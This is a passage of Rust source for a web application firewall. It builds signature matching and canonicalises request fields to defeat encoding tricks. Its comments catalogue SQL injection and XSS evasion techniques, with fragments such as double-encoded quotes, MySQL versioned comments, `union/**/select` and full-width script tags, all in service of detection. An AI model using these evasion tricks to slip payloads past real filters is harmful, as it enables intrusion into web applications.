/// first pattern listed wins ties at the same offset, and overlapping
/// matches resolve to the one starting earliest. DFA kind is preferred
/// for steady-state scan speed — the build cost (~µs) happens once at
/// startup.
fn build_signature_automaton() -> (AhoCorasick, Vec<&'static str>) {
    let patterns: Vec<&str> = BUILTIN_SIGNATURES.iter().map(|(p, _)| *p).collect();
    let categories: Vec<&'static str> = BUILTIN_SIGNATURES.iter().map(|(_, c)| *c).collect();
    // Don't pin a specific `AhoCorasickKind` — the auto-selector picks
    // ContiguousNFA (or DFA when patterns warrant). For our ~75 short
    // ASCII patterns the NFA is the cache-friendly winner; an explicit
    // DFA pin was measurably slower on short hot-path inputs.
    let ac = AhoCorasick::builder()
        .match_kind(MatchKind::LeftmostFirst)
        .ascii_case_insensitive(false)
        .build(&patterns)
        .expect("compile built-in WAF signature automaton");
    (ac, categories)
}

/// Multi-pass normalisation: URL-decode, lowercase, strip duplicate
/// slashes, collapse common evasion patterns. Loops up to `MAX_PASSES`
/// until output stabilises — defeats double/triple-encoded payloads
/// like `%2527` (→ `%27` → `'`) that single-pass decoders miss.
///
/// Returns `Cow::Borrowed` when nothing needed normalising (the hot
/// path for the vast majority of legitimate traffic), only allocating
/// when an evasion pattern is actually present.
/// V118 — decode HTML numeric character entities. Handles `&#NN;`
/// (decimal) and `&#xHH;` (hex). Named entities (e.g. `&lt;`) are
/// NOT decoded — sqlmap's `htmlencode` tamper only emits numeric
/// form, and decoding named entities would expand attack surface.
///
/// Invalid sequences pass through verbatim so we don't accidentally
/// drop legitimate `&#` substrings in user-generated content.
fn decode_html_numeric_entities(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if i + 3 < bytes.len() && bytes[i] == b'&' && bytes[i + 1] == b'#' {
            // Determine hex vs decimal.
            let (start, radix) = if bytes[i + 2] == b'x' || bytes[i + 2] == b'X' {
                (i + 3, 16)
            } else {
                (i + 2, 10)
            };
            // Scan up to 8 chars looking for terminating `;`.
            let end = (start..bytes.len().min(start + 8)).find(|&j| bytes[j] == b';');
            if let Some(end) = end
                && end > start
                && let Ok(digits) = std::str::from_utf8(&bytes[start..end])
                && let Ok(code) = u32::from_str_radix(digits, radix)
                && let Some(ch) = char::from_u32(code)
            {
                out.push(ch);
                i = end + 1;
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

/// V118 — strip SQL line comments. Replaces `-- <text>\n` and
/// `# <text>\n` with a single space so the keyword either side
/// stays detectable for Aho-Corasick. Conservative — only strips
/// patterns that match the SQL-spec form (the `--` form requires a
/// trailing whitespace per the SQL standard; bare `--foo` in URLs
/// is NOT a comment to a SQL parser and we leave it alone).
fn strip_sql_line_comments(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < bytes.len() {
        // `-- `, `--\t`, or `--+` (form-encoded space — sqlmap's
        // space2dash output before URL decoding fully resolves)
        if i + 2 < bytes.len()
            && bytes[i] == b'-'
            && bytes[i + 1] == b'-'
            && (bytes[i + 2] == b' ' || bytes[i + 2] == b'\t' || bytes[i + 2] == b'+')
        {
            // Skip to next \n or end.
            out.push(' ');
            let after = &bytes[i + 3..];
            if let Some(rel) = after.iter().position(|&b| b == b'\n' || b == b'\r') {
                i += 3 + rel + 1;
            } else {
                i = bytes.len();
            }
            continue;
        }
        // `#` MySQL line comment. Only treat as comment if NOT inside
        // a URL fragment (which would be `#frag`) or HTML entity
        // (`&#...`). Heuristic: previous char is whitespace OR
        // alphanumeric (keyword followed by `#`), and next char isn't
        // already at end.
        if bytes[i] == b'#' && i + 1 < bytes.len() {
            let prev_ok = if i == 0 {
                true
            } else {
                let p = bytes[i - 1];
                p == b' ' || p.is_ascii_alphanumeric()
            };
            // Don't consume the `#` of HTML numeric entities (`&#`).
            let is_html_entity = i > 0 && bytes[i - 1] == b'&';
            if prev_ok && !is_html_entity {
                out.push(' ');
                let after = &bytes[i + 1..];
                if let Some(rel) = after.iter().position(|&b| b == b'\n' || b == b'\r') {
                    i += 1 + rel + 1;
                } else {
                    i = bytes.len();
                }
                continue;
            }
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    out
}

fn canon(v: &str) -> Cow<'_, str> {
    // Fast-path: pure clean ASCII path with no evasion markers AND
    // no uppercase. Zero-alloc — pass the slice straight through.
    if is_already_canon(v) {
        return Cow::Borrowed(v);
    }
    const MAX_PASSES: usize = 4;
    // SECURITY (H4) — full-width / confusable Unicode folding. The ASCII
    // folding in `canon_once` never touches code points >= 0x80, so a
    // full-width `＜script＞` (U+FF1C/U+FF1E) — or confusable angle
    // brackets like `‹`/`›` — sails past the `<script` signature. Fold
    // those code points to their ASCII equivalents BEFORE the ASCII canon
    // passes.
    //
    // The `crate::normalisation` module already implements NFKC +
    // confusable folding, but its only public entry point — `normalise()`
    // — bundles a *destructive* percent-decode that widens each decoded
    // byte to a `char` individually, mojibake-ing already-UTF-8 input
    // (e.g. `%2fé` → `/ã©`). Its `unicode_nfkc` / `confusable_fold`
    // helpers are private, so we cannot reuse them in isolation without
    // editing that file. We therefore inline the same two transforms here
    // (full-width ASCII block U+FF01..U+FF5E → 0x21..0x7E, plus the
    // highest-leverage confusables), which is UTF-8-safe and leaves the
    // existing percent-/comment-decoding to `canon_once`.
    //
    // Gated on `is_ascii()` so the (already non-ASCII, slow-path) inputs
    // that reach here only pay for the fold when they actually carry
    // non-ASCII bytes; the pure-ASCII hot path returned a borrow above.
    let unicode_folded: Cow<'_, str> = if v.is_ascii() {
        Cow::Borrowed(v)
    } else {
        fold_unicode_confusables(v)
    };
    let v: &str = unicode_folded.as_ref();
    let first = canon_once(v);
    // First pass produced something different. Whether it's a borrow
    // (Cow::Borrowed pointing into `v`) or owned, we need it owned
    // before we can iterate further — `canon_once(&cur)` would
    // otherwise hold a borrow that prevents reassigning `cur`.
    let mut cur: String = match first {
        Cow::Borrowed(s) => s.to_string(),
        Cow::Owned(s) => s,
    };
    for _ in 1..MAX_PASSES {
        let next_cow = canon_once(&cur);
        let next_str: &str = next_cow.as_ref();
        if next_str == cur.as_str() {
            return Cow::Owned(cur);
        }
        let next_owned = next_cow.into_owned();
        cur = next_owned;
    }
    Cow::Owned(cur)
}

/// SECURITY (H4) — fold full-width and confusable Unicode code points to
/// their ASCII equivalents so signature matching can't be evaded with
/// homoglyphs (full-width `＜script＞`, `‹`/`›` angle brackets, etc.).
///
/// Mirrors the two private transforms in `crate::normalisation`
/// (`unicode_nfkc` for the full-width ASCII block + `confusable_fold`),
/// inlined here because that module's only public entry point bundles a
/// destructive percent-decode (see the call site in `canon`).
///
/// Returns `Cow::Borrowed` when nothing folded (e.g. a non-ASCII byte
/// that isn't a confusable, like accented Latin in a legitimate body),
/// so the only allocation is for inputs that actually carry a homoglyph.
fn fold_unicode_confusables(s: &str) -> Cow<'_, str> {
    // Highest-leverage confusables for the characters that gate the
    // built-in signatures (angle brackets, quotes, parens, separators).
    // Kept in sync conceptually with normalisation::confusable_fold.
    fn confusable(c: char) -> Option<char> {
        match c {
            '‹' | '＜' => Some('<'),
            '›' | '＞' => Some('>'),
            '′' | '‘' | '’' => Some('\''),
            '″' | '“' | '”' => Some('"'),
            '（' => Some('('),
            '）' => Some(')'),
            '；' => Some(';'),
            '：' => Some(':'),
            '｜' => Some('|'),
            '！' => Some('!'),
            '＆' => Some('&'),
            '＝' => Some('='),
            _ => None,
        }
    }
    let mut changed = false;
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        let cu = c as u32;
        // Full-width ASCII block U+FF01..U+FF5E → ASCII 0x21..0x7E
        // (offset 0xFEE0). Catches `＜`/`＞` via NFKC as well, but the
        // confusable table also covers the half-width-form angle quotes.
        if (0xFF01..=0xFF5E).contains(&cu) {
            out.push(char::from_u32(cu - 0xFEE0).unwrap_or(c));
            changed = true;
        } else if let Some(rep) = confusable(c) {
            out.push(rep);
            changed = true;
        } else {
            out.push(c);
        }
    }
    if changed {
        Cow::Owned(out)
    } else {
        Cow::Borrowed(s)
    }
}

/// True when `v` requires no normalisation: ASCII-only, no
/// percent-encoding, no `+`, no `\`, no `/*` or `*/` markers, no
/// uppercase letters, no double whitespace. Hot-path predicate —
/// must stay branchless and fast.
fn is_already_canon(v: &str) -> bool {
    let bytes = v.as_bytes();
    let mut prev_ws = false;
    for &b in bytes {
        match b {
            // V118 — added backtick + nul-byte to the bail list.
            b'%' | b'+' | b'\\' | b'`' | 0 => return false,
            b'A'..=b'Z' => return false,
            // 0x80+ means non-ASCII — bail to slow path so urlencoding
            // gets a chance to normalise UTF-8 escapes.
            0x80..=0xff => return false,
            // Whitespace runs need collapsing.
            b' ' | b'\t' | b'\n' | b'\r' => {
                if prev_ws {
                    return false;
                }
                prev_ws = true;
            }
            _ => prev_ws = false,
        }
    }
    // V118 — bail on `/*`, `*/`, `&#` (HTML entities). Two-byte window
    // scans, all cheap.
    // V230 — these used `str::contains` previously, which rebuilds
    // search state on each call. Swap to the module-cached
    // `memchr::memmem::Finder` set so the SIMD prefilter kicks in.
    let finders = evasion_finders();
    let bytes = v.as_bytes();
    finders[evasion_idx::COMMENT_OPEN].find(bytes).is_none()
        && finders[evasion_idx::COMMENT_CLOSE].find(bytes).is_none()
        && finders[evasion_idx::HTML_ENTITY].find(bytes).is_none()
}

/// V230 — module-level cache of `memchr::memmem::Finder` instances for
/// every multi-byte evasion-trigger needle scanned in `canon_once`.
///
/// Each `Finder` precomputes a Boyer-Moore-style skip table once at
/// first access, then every subsequent `find()` uses SIMD prefilter
/// (NEON / SSE4.2 / AVX2) to skip large windows where the first needle
/// byte can't occur. For our typical payloads (>32 bytes) this is
/// 3-10× faster than the equivalent `str::contains` calls, which
/// re-build their search state on every call. Order intentionally
/// matches the trigger list in the original `needs_subst` predicate.
///
/// Indexed by [`EvasionNeedle`].
fn evasion_finders() -> &'static [Finder<'static>; 8] {
    static FINDERS: OnceLock<[Finder<'static>; 8]> = OnceLock::new();
    FINDERS.get_or_init(|| {
        [
            Finder::new(b"/*"),
            Finder::new(b"*/"),
            Finder::new(b"&#"),
            Finder::new(b"--"),
            Finder::new(b"%2f"),
            Finder::new(b"%5c"),
            Finder::new(b"\\u002f"),
            Finder::new(b"\\x2f"),
        ]
    })
}

/// Stable indices into [`evasion_finders`]. Keep in sync with the
/// array literal above.
#[allow(dead_code)]
mod evasion_idx {
    pub const COMMENT_OPEN: usize = 0;
    pub const COMMENT_CLOSE: usize = 1;
    pub const HTML_ENTITY: usize = 2;
    pub const DASH_DASH: usize = 3;
    pub const PCT_2F: usize = 4;
    pub const PCT_5C: usize = 5;
    pub const ESC_U_002F: usize = 6;
    pub const ESC_X_2F: usize = 7;
}

fn canon_once(v: &str) -> Cow<'_, str> {
    // Step 1: URL-decode. urlencoding returns Cow::Borrowed when
    // there was nothing to decode — propagate that.
    let decoded: Cow<'_, str> = urlencoding::decode(v).unwrap_or(Cow::Borrowed(v));

    // V118 — Step 1.5: decode HTML numeric entities so sqlmap's
    // `htmlencode` tamper (`&#x55;` for U, `&#85;` for U) collapses
    // back to the plain payload before keyword matching. Cheap when
    // no `&#` is present.
    // V230 — use cached `memchr::memmem::Finder` (SIMD prefilter)
    // instead of `str::contains` for the trigger check.
    let finders = evasion_finders();
    let html_decoded: Cow<'_, str> = if finders[evasion_idx::HTML_ENTITY]
        .find(decoded.as_bytes())
        .is_some()
    {
        Cow::Owned(decode_html_numeric_entities(&decoded))
    } else {
        decoded
    };

    // V118 — Step 1.6: strip SQL line comments. sqlmap's `space2dash`
    // and `space2hash` tampers insert `-- <noise>\n` or `# <noise>\n`
    // between keywords so the SQL engine eats the comment but a naive
    // WAF sees garbage. We collapse the comment to a single space so
    // `union-- foo\nselect` → `union select` for keyword matching.
    // strip_sql_line_comments also normalises `+` to space first
    // (form-encoding) so `--+noise%0a` (already URL-decoded to
    // `--+noise\n`) gets normalised to `-- noise\n` before the strip.
    // V230 — `--` checked via SIMD memchr; `#` is single-byte so
    // `memchr::memchr` is the right primitive (Finder overhead doesn't
    // help for 1-byte needles).
    let html_bytes = html_decoded.as_bytes();
    let line_stripped: Cow<'_, str> = if finders[evasion_idx::DASH_DASH].find(html_bytes).is_some()
        || memchr::memchr(b'#', html_bytes).is_some()
    {
        Cow::Owned(strip_sql_line_comments(&html_decoded))
    } else {
        html_decoded
    };

    // Step 2: lowercase. Only allocate if any uppercase ASCII present.
    let lowered: Cow<'_, str> = if line_stripped.bytes().any(|b| b.is_ascii_uppercase()) {
        Cow::Owned(line_stripped.to_ascii_lowercase())
    } else {
        line_stripped
    };

    // Step 3: targeted substitutions in a single pass. Only allocate
    // when at least one of the trigger byte/sequence is present.
    // V118 — added triggers for sqlmap tampers: backtick (identifier
    // wrap), null byte (`appendnullbyte`), `/*` (general comments,
    // not just `/*!`).
    // V230 — six multi-byte triggers (`%2f`, `%5c`, `/`, `\x2f`,
    // `/*`, `*/`) now use module-cached `memchr::memmem::Finder` for
    // SIMD-accelerated containment checks.
    let lowered_bytes = lowered.as_bytes();
    let needs_subst = lowered_bytes.iter().any(|&b| {
        b == b'+' || b == b'\\' || b == b'\t' || b == b'\n' || b == b'\r' || b == b'`' || b == 0
    }) || finders[evasion_idx::PCT_2F].find(lowered_bytes).is_some()
        || finders[evasion_idx::PCT_5C].find(lowered_bytes).is_some()
        || finders[evasion_idx::ESC_U_002F]
            .find(lowered_bytes)
            .is_some()
        || finders[evasion_idx::ESC_X_2F].find(lowered_bytes).is_some()
        || finders[evasion_idx::COMMENT_OPEN]
            .find(lowered_bytes)
            .is_some()
        || finders[evasion_idx::COMMENT_CLOSE]
            .find(lowered_bytes)
            .is_some();
    let subbed: Cow<'_, str> = if !needs_subst {
        lowered
    } else {
        let s = lowered.as_ref();
        // V233 — BUG 1 (panic_crash): this loop previously did
        // `let rest = &s[i..]` (and `&s[j..]`, `&s[i+2..]`, etc.)
        // where `i`/`j` advance by FIXED byte widths (`+=6/4/3/2/1`).
        // When a substitution (e.g. `%2f` → `/`, +3) landed the cursor
        // inside a multi-byte UTF-8 character, slicing a `&str` at that
        // non-char-boundary byte index panics ("byte index N is not a
        // char boundary"). On a release build (`panic = "abort"`) that
        // SIGABRTs the worker — a one-request remote crash primitive.
        //
        // Fix: operate entirely on `s.as_bytes()` (`&[u8]` indexing is
        // never subject to char-boundary panics) and build the output
        // byte-by-byte. ASCII bytes are pushed verbatim; any byte
        // >= 0x80 (a UTF-8 continuation/lead byte) is copied through
        // unchanged, which reassembles the original multi-byte chars
        // exactly. The canonicalisation result is identical to the old
        // code for every all-ASCII input; for inputs containing
        // multi-byte chars it now produces correct UTF-8 instead of
        // panicking. `out` is finished via `from_utf8_lossy` so a
        // pathological input can never yield an invalid `String`.
        let bytes = s.as_bytes();
        let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
        // V233 — byte-slice helpers replacing `str::starts_with` /
        // `str::find` on computed offsets.
        let starts_with = |at: usize, needle: &[u8]| -> bool {
            bytes.len() - at >= needle.len() && &bytes[at..at + needle.len()] == needle
        };
        // Find the next `*/` at or after byte index `from`; returns the
        // absolute index of its first byte. memmem handles non-ASCII
        // content inside the comment without any boundary concerns.
        let find_close = |from: usize| -> Option<usize> {
            memchr::memmem::find(&bytes[from..], b"*/").map(|rel| from + rel)
        };
        let mut i = 0;
        while i < bytes.len() {
            // 6-byte sequences first (longest-match).
            if starts_with(i, b"\\u002f") {
                out.push(b'/');
                i += 6;
                continue;
            }
            if starts_with(i, b"\\x2f") {
                out.push(b'/');
                i += 4;
                continue;
            }
            // 3-byte sequences.
            if starts_with(i, b"%2f") {
                out.push(b'/');
                i += 3;
                continue;
            }
            if starts_with(i, b"%5c") {
                out.push(b'\\');
                i += 3;
                continue;
            }
            // V118 — `/*!...*/` MySQL versioned comment: keep the
            // INNER content (older MySQL executes it). Skip the `/*!`
            // prefix + any version digits, leave the keyword visible
            // for matching, then continue past `*/`.
            // Example: `/*!50000union*/` → ` union `.
            if starts_with(i, b"/*!") {
                let mut j = i + 3;
                // Optional version digits (1-5 chars per MySQL spec).
                while j < bytes.len() && bytes[j].is_ascii_digit() {
                    j += 1;
                }
                out.push(b' ');
                if let Some(end) = find_close(j) {
                    // Push the inner content verbatim so it can match.
                    out.extend_from_slice(&bytes[j..end]);
                    out.push(b' ');
                    i = end + 2;
                    continue;
                } else {
                    out.extend_from_slice(&bytes[j..]);
                    i = bytes.len();
                    continue;
                }
            }
            // V118 / V233 — BUG 4 (auth_bypass): generic `/* ... */`
            // inline comment strip. sqlmap's space2comment /
            // space2morecomments / commentbeforeparentheses tampers
            // insert `/**/` (or `/*noise*/`) between SQL keywords;
            // MySQL's lexer treats `/* ... */` as whitespace, so
            // `union/**/select` is a working injection. We collapse
            // ANY `/* ... */` span (with arbitrary inner content, not
            // just the `/*!`-versioned form) to a single space, so
            // `union/*x*/select` → `union select` and the built-in
            // signature matches. The span is skipped wholesale even
            // when the comment body contains multi-byte UTF-8.
            if starts_with(i, b"/*") {
                if let Some(end) = find_close(i + 2) {
                    out.push(b' ');
                    i = end + 2;
                    continue;
                } else {
                    out.push(b' ');
                    i = bytes.len();
                    continue;
                }
            }
            if starts_with(i, b"*/") {
                out.push(b' ');
                i += 2;
                continue;
            }
            let b = bytes[i];
            // `+` → space (urlencoded form delimiter, common evasion).
            if b == b'+' {
                out.push(b' ');
                i += 1;
                continue;
            }
            // Whitespace already collapsed below; here we just normalise
            // tab/CR/LF to plain space so collapse handles them.
            if b == b'\t' || b == b'\n' || b == b'\r' {
                out.push(b' ');
                i += 1;
                continue;
            }
            // V118 — strip backticks (MySQL identifier wrapping;
            // sqlmap puts `\`union\`` around keywords to dodge naive
            // regex matchers). Drop entirely; keyword boundaries
            // come from surrounding whitespace.
            if b == b'`' {
                i += 1;
                continue;
            }
            // V118 — drop null bytes (sqlmap `appendnullbyte` tamper).
            if b == 0 {
                i += 1;
                continue;
            }
            // V233 — push the raw byte. ASCII bytes are pushed
            // verbatim; bytes >= 0x80 are UTF-8 lead/continuation
            // bytes copied through unchanged so multi-byte chars
            // round-trip exactly. (The old code did `b as char`,
            // which mojibake-d every non-ASCII byte into U+0080..U+00FF
            // — byte-copy is strictly more correct and never panics.)
            out.push(b);
            i += 1;
        }
        // V233 — `out` is well-formed UTF-8 for every realistic input
        // (ASCII transforms + verbatim multi-byte passthrough);
        // `from_utf8_lossy` is a zero-copy borrow in that case and a
        // belt-and-braces guard against a pathological split otherwise.
        match String::from_utf8_lossy(&out) {
            Cow::Borrowed(valid) => Cow::Owned(valid.to_string()),
            Cow::Owned(repaired) => Cow::Owned(repaired),
        }
    };

    // Step 4: collapse whitespace runs to single space. Only allocate
    // if a run is actually present.
    let has_run = {
        let bytes = subbed.as_bytes();
        let mut prev = false;
        let mut hit = false;
        for &b in bytes {
            let is_ws = b == b' ';
            if is_ws && prev {
                hit = true;
                break;
            }
            prev = is_ws;
        }
        hit
    };
    if !has_run {
        return subbed;
    }
    let mut out = String::with_capacity(subbed.len());
    let mut prev_ws = false;
    for c in subbed.chars() {
        let is_ws = c == ' ';
        if is_ws && prev_ws {
            continue;
        }
        out.push(c);
        prev_ws = is_ws;
    }
    Cow::Owned(out)
}

/// V230 — request-scoped cache of canonicalised forms for the small
/// set of fields the WAF reads on every hot-path request. Built once
/// at the top of [`WafFilter::check`] and threaded into both the
/// built-in signature scan ([`WafFilter::match_signature_canon`]) and
/// the compiled-rules eval ([`CompiledRules::eval_canon`]) so each
/// field's `canon()` runs at most once per request.
///
/// Each entry is a `Cow<'a, str>` — `Borrowed` when the original was
/// already canonical (the overwhelming hot path), `Owned` only when
/// canonicalisation actually had work to do. Lifetimes are bound to
/// the `RequestContext` so no extra allocs are required to plumb
/// references through `eval`.
///
/// Fields not pre-populated here (cookies-by-name, JA4 family, etc.)
/// fall through to the original per-field canon path in `val_with_canon`.
struct CanonCtx<'a> {
    /// Lowercased, decoded URI path (request line target). Includes
    /// any query string portion.
    path: Cow<'a, str>,
    /// Lowercased HTTP method (`get`, `post`, ...). Cheap to compute
    /// even with no canon work (HTTP methods are already-canon ASCII
    /// in practice, but uppercase is the common case).
    method: Cow<'a, str>,
    /// Canon user-agent. Empty `Cow::Borrowed("")` when absent.
    user_agent: Cow<'a, str>,
    /// Canon `Referer:` header. Empty when absent.
    referer: Cow<'a, str>,
    /// Canon `Cookie:` header (full raw value). Empty when absent.
    cookie: Cow<'a, str>,
    /// Canon `Host:` from the context (NOT the header — the proxy
    /// pre-resolves the routing host into `ctx.host`).
    host: Cow<'a, str>,
}

impl<'a> CanonCtx<'a> {
    fn from_ctx(ctx: &'a RequestContext) -> Self {
        // ctx.user_agent / referer / cookie may be absent — represent
        // missing as `Borrowed("")` so callers see a uniform &str.
        let ua_raw = ctx.user_agent.as_deref().unwrap_or("");
        let referer_raw = ctx
            .headers
            .get("referer")
            .and_then(|h| h.to_str().ok())
            .unwrap_or("");
        let cookie_raw = ctx
            .headers
            .get("cookie")
            .and_then(|h| h.to_str().ok())
            .unwrap_or("");
        Self {
            path: canon(&ctx.path),
            // Method is short and almost always uppercase ASCII; the
            // canon machinery is overkill — emit a 1-pass lowercase.
            method: {
                let m = ctx.method.as_str();
                if m.bytes().all(|b| b.is_ascii_lowercase()) {
                    Cow::Borrowed(m)
                } else {
                    Cow::Owned(m.to_ascii_lowercase())
                }
            },
            user_agent: canon(ua_raw),
            referer: canon(referer_raw),
            cookie: canon(cookie_raw),
            host: canon(&ctx.host),
        }
    }
}

/// V230 — `val()` variant that consults the request-scoped
/// [`CanonCtx`] for the common fields before falling through to the
/// original per-call `canon()` path. Saves 5-10 `canon()` calls per
/// request for the typical rule set (path, method, user_agent,
/// referer, cookie share the same canon work as the signature scan).
///
/// Returns `Cow::Borrowed` whenever the canon ctx (or the original
/// `ctx`) already has the needed form; `Cow::Owned` for cookies/JA4/
/// numeric coercions that genuinely require allocation.
fn val_with_canon<'a>(
    ctx: &'a RequestContext,
    canon_ctx: &'a CanonCtx<'a>,
    field: &str,
) -> Cow<'a, str> {
    match field {
        "path" => match &canon_ctx.path {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        "query" => {
            let q = ctx.path.split_once('?').map(|(_, q)| q).unwrap_or("");
            canon(q)
        }
        "uri_length" => Cow::Owned(ctx.path.len().to_string()),
        "method" => match &canon_ctx.method {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        "user_agent" => match &canon_ctx.user_agent {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        "content_length" => Cow::Borrowed(
            ctx.headers
                .get("content-length")
                .and_then(|h| h.to_str().ok())
                .unwrap_or("0"),
        ),
        "host" => match &canon_ctx.host {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        // JA4 family — full fingerprint strings. Use op=`starts_with`
        // to match a JA4_a class (`t13d` = TLS 1.3 with SNI) or
        // op=`equals` for a specific full hash. Returns empty string
        // when the fingerprint wasn't captured for this connection.
        // JA3 — the legacy MD5 TLS ClientHello fingerprint. Kept for
        // parity with rulesets/threat-feeds that still key on JA3 hashes.
        "ja3" => Cow::Borrowed(ctx.ja3.as_deref().unwrap_or("")),
        "ja4" => Cow::Borrowed(ctx.ja4.as_deref().unwrap_or("")),
        "ja4h" => Cow::Borrowed(ctx.ja4h().unwrap_or("")),
        "ja4t" => Cow::Borrowed(ctx.ja4t.as_deref().unwrap_or("")),
        "ja4l" => Cow::Borrowed(ctx.ja4l.as_deref().unwrap_or("")),
        "h2fp" => Cow::Borrowed(ctx.h2fp.as_deref().unwrap_or("")),
        "h3fp" => Cow::Borrowed(ctx.h3fp.as_deref().unwrap_or("")),
        "mtls_fp" => Cow::Borrowed(ctx.mtls_fp.as_deref().unwrap_or("")),
        "client_ip" => Cow::Owned(ctx.client_ip.to_string()),
        // V230 — `header:referer` and `header:cookie` are pre-canonicalised
        // in the canon ctx (most common cases). Other headers fall through.
        "header:referer" => match &canon_ctx.referer {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        "header:cookie" => match &canon_ctx.cookie {
            Cow::Borrowed(s) => Cow::Borrowed(*s),
            Cow::Owned(s) => Cow::Borrowed(s.as_str()),
        },
        f if f.starts_with("header:") => {
            let k = f.trim_start_matches("header:");
            canon(
                ctx.headers
                    .get(k)
                    .and_then(|h| h.to_str().ok())
                    .unwrap_or(""),
            )
        }
        f if f.starts_with("cookie:") => {
            let target = f.trim_start_matches("cookie:");
            // Cookie extraction needs the raw header; reuse the already-
            // captured raw cookie string from `canon_ctx` indirectly by
            // re-reading the header (extract_cookie wants the un-canon
            // form to split on `;` reliably; canonicalising the whole
            // cookie header first would mangle delimiters).
            let raw_opt = ctx.headers.get("cookie").and_then(|h| h.to_str().ok());
            match raw_opt {
                Some(raw) => canon(&extract_cookie(raw, target)).into_owned().into(),
                None => Cow::Borrowed(""),
            }
        }
        _ => Cow::Borrowed(""),
    }
}

fn extract_cookie(raw: &str, name: &str) -> String {
    for part in raw.split(';') {
        let trimmed = part.trim();
        if let Some(eq) = trimmed.find('=') {
            let (k, v) = trimmed.split_at(eq);
            if k.eq_ignore_ascii_case(name) {
                return v[1..].to_string();
            }
        }
    }
    String::new()
}

/// Op-match a single canonicalised request value against a single
/// canonicalised needle, for the four string ops compound `all_of`
/// groups support: `contains` | `equals` | `starts_with` | `ends_with`.
///
/// These are the SAME semantics the compiled-plan buckets implement
/// (substring / exact / prefix / suffix on canonicalised strings); this
/// helper exists so the `all_of` verification path reuses them verbatim
/// rather than duplicating the matching logic. `regex` is accepted as an
/// alias for `contains`, mirroring the compiled plan's historical
/// substring degradation. Any other op makes the group fail closed (the
/// compound rule won't fire), since an `all_of` group is only meaningful
/// with one of the four string ops.
fn op_matches(haystack: &str, op: &str, needle: &str) -> bool {
    match op {
        "contains" | "regex" => haystack.contains(needle),
        "equals" => haystack == needle,
        "starts_with" => haystack.starts_with(needle),
        "ends_with" => haystack.ends_with(needle),
        _ => false,
    }
}

/// Compare two numerics for ops like `gt` / `lt`. Falls back to string
/// comparison when either side isn't a number — useful for `content_length
/// gt 1048576` style rules.
fn cmp_numeric(left: &str, right: &str, op: &str) -> bool {
    let (Ok(l), Ok(r)) = (left.parse::<u64>(), right.parse::<u64>()) else {
        return false;
    };
    match op {
        "gt" => l > r,
        "lt" => l < r,
        "ge" => l >= r,
        "le" => l <= r,
        _ => false,
    }
}

/// V95 — pre-compiled view of `Vec<WafRule>` for the hot path.
///
/// At compile time we bucket every rule by `(field, op)`, then build
/// one AhoCorasick per field for the unified `contains`/`regex` set
/// (regex currently degrades to substring per the historical behaviour
/// in check_custom_rules). Equality rules go into per-field HashMaps
/// for O(1) lookup; V230 — starts_with now uses an anchored
/// AhoCorasick per field ([`PrefixMatcher`]) and ends_with uses a
/// last-byte-bucketed table ([`SuffixMatcher`]), replacing the
/// original Vec scans that became O(N×L) for prefix-heavy rulesets.
///
/// Rule ordering vs precedence: the eval path returns the FIRST hit
/// in original rule order, mirroring the pre-V95 sequential loop.
/// AhoCorasick MatchKind::LeftmostFirst returns the lowest-pattern-id
/// match, so we order `pattern_to_rule` by rule index when building —
/// the first hit corresponds to the earliest matching rule.
///
/// Memoisation: the caller builds a small `FieldCache` so calling
/// `val(ctx, field)` more than once per request (when multiple rule
/// kinds touch the same field) is O(1) on subsequent hits.
/// V230 — bitmask of which rule kinds (contains, equals, starts_with,
/// ends_with) actually have entries for a given field. Used in
/// [`CompiledRules::eval`] to short-circuit empty per-field HashMap
/// probes when a kind isn't present — most production rulesets only
/// use 1-2 ops per field, so 2-3 of the 4 probes per field per
/// request are wasted work in the absence of this gate.
const FIELD_KIND_CONTAINS: u8 = 1 << 0;
const FIELD_KIND_EQUALS: u8 = 1 << 1;
const FIELD_KIND_STARTS: u8 = 1 << 2;
const FIELD_KIND_ENDS: u8 = 1 << 3;

struct CompiledRules {
    /// Per-field AhoCorasick over the union of contains+regex patterns.
    /// V230 — switched HashMap → FxHashMap (keys are operator-supplied
    /// field names; not attacker-controlled, weaker hash is fine).
    contains: FxHashMap<String, FieldAutomaton>,
    /// Per-field equality lookup. value → first-matching rule index.
    /// V230 — outer map switched to FxHashMap; inner map keys can be
    /// attacker-controlled (matched against canonicalised request
    /// values) so kept as the SipHash-backed `HashMap`.
    equals: FxHashMap<String, HashMap<String, usize>>,
    /// Per-field starts_with patterns.
    /// V230 — was `Vec<(usize, String)>` linearly scanned per request,
    /// O(N×L) for prefix-heavy rulesets (path bucket commonly grows
    /// large in production: `/wp-admin/`, `/.env`, `/api/v1/`, …).
    /// Now an anchored Aho-Corasick automaton over the prefix set,
    /// matching the existing pattern in `ua_fp_mismatch::ja4_tool_prefix_automaton`.
    /// A single Teddy/NFA pass anchored at offset 0 replaces the chain
    /// of `String::starts_with` calls and is O(L_max_prefix) instead of
    /// O(sum_of_prefix_lens). When the field has zero or one prefix
    /// rules we keep the trivial Vec (AC build overhead dominates and
    /// `str::starts_with` is already a memcmp).
    starts_with: FxHashMap<String, PrefixMatcher>,
    /// Per-field ends_with patterns.
    /// V230 — was `Vec<(usize, String)>` linearly scanned per request.
    /// Now bucketed by suffix last-byte (256 buckets). The eval-time
    /// last byte of the input value (e.g. path) selects exactly one
    /// bucket; in the typical case (e.g. path ends in `/`) only
    /// suffixes sharing that last byte are scanned, and 99% of
    /// buckets are skipped entirely. Falls back to a single-entry
    /// scan when only one suffix is registered for the field.
